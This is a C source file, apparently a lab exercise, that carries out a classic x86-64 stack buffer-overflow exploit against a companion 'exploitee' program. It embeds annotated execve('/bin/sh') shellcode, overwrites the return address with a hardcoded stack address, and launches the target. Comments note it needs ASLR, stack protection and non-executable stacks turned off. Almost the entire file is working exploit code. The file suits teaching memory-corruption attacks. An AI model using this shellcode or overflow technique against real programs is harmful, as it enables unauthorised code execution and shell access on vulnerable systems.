#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>

// test basic buffer-overflow exploitation technique on x86-64
// (needs "kernel.randomize_va_space = 0" in /etc/sysctl.conf)
//
// gcc -g -Wall -Wextra -static -z execstack -fno-stack-protector -std=c99 -o exploiter shcode_exploiter.c
// gcc -g -Wall -Wextra -static -z execstack -fno-stack-protector -std=c99 -o exploitee shcode_exploitee.c
//
typedef unsigned long long int uint64;

int main(int argc, char** argv) {
	char shcode[] =
		// NOTE:
		//   3rd byte of "xor rax,rax" and following instructions
		//   get corrupted by "push %rdx" (buffer is on discarded
		//   stackframe and %rsp is moved down too far --> change
		//   0x20 to 0x10 in first line to fix, or just omit the
		//   instruction if one can assume that at least 16 bytes
		//   of space exist between %rbp and %rsp)
		//
		// "\x48\x83\xec\x10"                          //  0: sub    $0x10,%rsp
		"\x48\xba\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  //  4: movabs $0x68732f6e69622f2f,%rdx
		"\x48\xc1\xea\x08"                          // 14: shr    $0x8,%rdx
		"\x52"                                      // 18: push   %rdx
		"\x48\x89\x65\xf0"                          // 19: mov    %rsp,-0x10(%rbp)     name[0] = "/bin/sh"
		"\x48\x31\xd2"                              // 23: xor    %rdx,%rdx
		"\x48\x89\x55\xf8"                          // 26: mov    %rdx,-0x8(%rbp)      name[1] = NULL
		"\x48\x8b\x7d\xf0"                          // 30: mov    -0x10(%rbp),%rdi     rdi = name[0] (arg #1)
		"\x48\x8d\x75\xf0"                          // 34: lea    -0x10(%rbp),%rsi     rsi = &name (arg #2)
		"\x48\x31\xc0"                              // 38: xor    %rax,%rax
		"\x48\x83\xc0\x3b"                          // 41: add    $0x3b,%rax
		"\x0f\x05";                                 // 45: syscall
	char buffer[64 + sizeof(void*) * 2 + 1] = {127};
	char* pargv[3] = {"exploitee", &buffer[0], NULL};
	char* penvv[1] = {NULL};

	// (8-byte address) 0x 7f ff ff ff ec d0 = 140737488350416 = &buffer[0] in exploitee
	//  (gdb) p *((unsigned char*) shcode+64+ 8)  208 = 0xd0
	//  (gdb) p *((unsigned char*) shcode+64+ 9)  236 = 0xec
	//  (gdb) p *((unsigned char*) shcode+64+10)  255 = 0xff
	//  (gdb) p *((unsigned char*) shcode+64+11)  255 = 0xff
	//  (gdb) p *((unsigned char*) shcode+64+12)  255 = 0xff
	//  (gdb) p *((unsigned char*) shcode+64+13)  127 = 0x7f
	//  (gdb) p *((unsigned char*) shcode+64+14)    0 = 0x00
	//  (gdb) p *((unsigned char*) shcode+64+15)  101 = ????
	//
	// char retaddr[] = "\x00\x00"   "\x7f\xff\xff\xff\xec\xd0";
	char retaddr[] = "\xd0\xec\xff\xff\xff\x7f"   "\x00\x00";

	assert((sizeof(shcode)) <= (sizeof(buffer) - sizeof(void*) * 2));
	assert((sizeof(retaddr) - 1) == sizeof(void*));

	memset(buffer,                     127, sizeof(buffer));
	memset(buffer + sizeof(buffer) - 1,  0,              1);

	// copy shellcode bytes (the final code byte is a
	// 0-terminator literal added by compiler, skip it)
	for (unsigned int n = 0; n < (sizeof(shcode) - 1); n++) {
		buffer[n] = shcode[n];
	}

	// copy address of start of exploitee's buffer into penultimate 8 bytes (overwrites rbp)
	// this is needed when exploitee uses single *cpy because shellcode still references rbp
	// so it must be a valid stack location
	//
	// for (unsigned int n = (sizeof(buffer) - sizeof(void*) * 2 - 1); n < (sizeof(buffer) - sizeof(void*) - 1); n++) {
	//   buffer[n] = retaddr[n - (sizeof(buffer) - sizeof(void*) * 2 - 1)];
	// }

	// copy address of start of exploitee's buffer into last 8 bytes (overwrites ret)
	for (unsigned int n = (sizeof(buffer) - sizeof(void*) - 1); n < (sizeof(buffer) - 1); n++) {
		buffer[n] = retaddr[n - (sizeof(buffer) - sizeof(void*) - 1)];
	}


	printf("[%s][%s] strlen(buffer)=%lu\n", argv[0], __FUNCTION__, strlen(buffer));
	execve(pargv[0], pargv, penvv);

	(void) argc;
	return 0;
}

